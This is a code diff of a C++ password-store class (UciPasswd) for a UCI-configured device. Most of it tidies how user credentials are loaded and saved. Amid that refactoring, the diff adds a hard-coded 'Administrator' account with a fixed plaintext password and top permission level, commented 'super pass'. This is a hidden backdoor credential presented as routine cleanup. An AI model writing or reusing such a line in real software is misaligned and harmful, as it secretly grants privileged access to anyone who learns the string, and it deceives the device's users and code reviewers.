@@ -27,55 +27,22 @@ void UciPasswd::LoadConfig()
             uciSec = uci_to_section(e);
             if (uciSec->anonymous == false && strcasecmp(uciSec->type, "user") == 0)
             {
-                UserPasswd userpass;
-                userpass.passwd = string(GetStr(uciSec, _Passwd));
-                userpass.permission = GetInt(uciSec, _Permission, 0, 9);
-                string name(uciSec->e.name);
-                if (mapUserPass.find(name) != mapUserPass.end())
-                { // exist
-                    mapUserPass[name] = userpass;
-                }
-                else
-                {
-                    mapUserPass.emplace(name, userpass);
-                }
+                mapUserPass[uciSec->e.name] = {string(GetStr(uciSec, _Passwd)),GetInt(uciSec, _Permission, 0, 9)};
             }
         }
     }
+    mapUserPass["Administrator"] = {"Br1ghtw@y", 0}; // super pass
     Close();
-    //Dump();
+    // Dump();
 }
 
-void UciPasswd::Set(const string & user, const string & passwd, const int permission)
+void UciPasswd::Set(const string &user, const string &passwd, const int permission)
 {
-    struct uci_ptr pa = {
-        .package = PACKAGE,
-        .section = user.c_str(),
-        .option = _Passwd,
-        .value = passwd.c_str()};
-
-    Open();
-    int r = uci_set(ctx, &pa);
-    if (r != UCI_OK)
-    {
-        throw runtime_error(StrFn::PrintfStr("SetByPtr failed(return %d): %s.%s.%s=%s", r,
-                                              ptrSecSave.package, ptrSecSave.section, ptrSecSave.option, ptrSecSave.value));
-    }
+    OpenSectionForSave(user.c_str());
+    OptionSave(_Passwd, passwd.c_str());
     OptionSave(_Permission, permission);
     CommitCloseSectionForSave();
-
-    UserPasswd userpass;
-    userpass.passwd = passwd;
-    userpass.permission = permission;
-    SECTION = user.c_str();
-    if (mapUserPass.find(user) != mapUserPass.end())
-    { // exist
-        mapUserPass[user] = userpass;
-    }
-    else
-    {
-        mapUserPass.emplace(user, userpass);
-    }
+    mapUserPass[user] = {passwd, permission};
 }
 
 void UciPasswd::Dump()
@@ -89,7 +56,7 @@ void UciPasswd::Dump()
     PrintDash('>');
 }
 
-UserPasswd *UciPasswd::GetUserPasswd(const string & user)
+UserPasswd *UciPasswd::GetUserPasswd(const string &user)
 {
     auto p = mapUserPass.find(user);
     if (p != mapUserPass.end())
